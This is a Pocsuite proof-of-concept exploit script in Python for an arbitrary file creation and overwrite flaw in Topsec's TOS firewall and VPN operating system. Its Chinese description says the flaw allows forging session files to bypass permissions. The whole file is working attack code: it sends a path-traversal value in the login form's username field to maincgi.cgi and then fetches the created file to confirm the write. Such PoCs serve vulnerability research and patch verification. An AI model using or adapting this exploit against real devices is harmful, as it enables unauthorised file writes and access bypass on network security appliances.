#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import pycurl
import StringIO
import urllib

class TestPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['s0m30ne']
    vulDate = ''
    createDate = '2016-06-14'
    updateDate = '2016-06-14'
    references = ['http://www.seebug.org/vuldb/ssvid-']
    name = '天融信TOS安全操作系统任意文件写入覆盖'
    appPowerLink = ''
    appName = ''
    appVersion = ''
    vulType = '任意文件写入'
    desc = '''
    天融信完全自主知识产权的TOS（Topsec Operating System）安全操作系统设计缺陷导致任意文件创建、覆盖以及写入部分数据。影响基于此系统开发的NGFW4000、TopVPN6000、TopGate300等系列产品。可覆盖已有文件，创建新文件，写入内容部分可控。可以伪造session文件，绕过部分权限。
    '''
    samples = ['']
    install_requires = ['']
    #请尽量不要使用第三方库，必要时参考 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md#poc-第三方模块依赖说明 填写该字段

    def _attack(self):

        return self._verify()

    def _verify(self):
        result = {}

        self.getData('POST', '%s/cgi/maincgi.cgi?Url=Index' % self.url)
        data = self.getData('GET', '%s/site/image/test' % self.url)
        if '../htdocs/site/image/test' in data:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Url'] = self.url

        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

    def getData(self, method, url):
        payload = {
            'user_name_tex': '../htdocs/site/image/test',
            'user_pass_pas': 'test',
            'loginRegister': ''
        }

        crl = pycurl.Curl()
        buf = StringIO.StringIO()
        crl.setopt(pycurl.CONNECTTIMEOUT, 60)
        crl.setopt(pycurl.TIMEOUT, 300)
        crl.setopt(pycurl.SSL_VERIFYPEER, 0)   
        crl.setopt(pycurl.SSL_VERIFYHOST, 0)
        if method == 'POST':
            crl.setopt(crl.POSTFIELDS,  urllib.urlencode(payload))
        crl.setopt(pycurl.URL, url)
        crl.setopt(crl.WRITEFUNCTION, buf.write)
        crl.perform()
        return buf.getvalue()

register(TestPOC)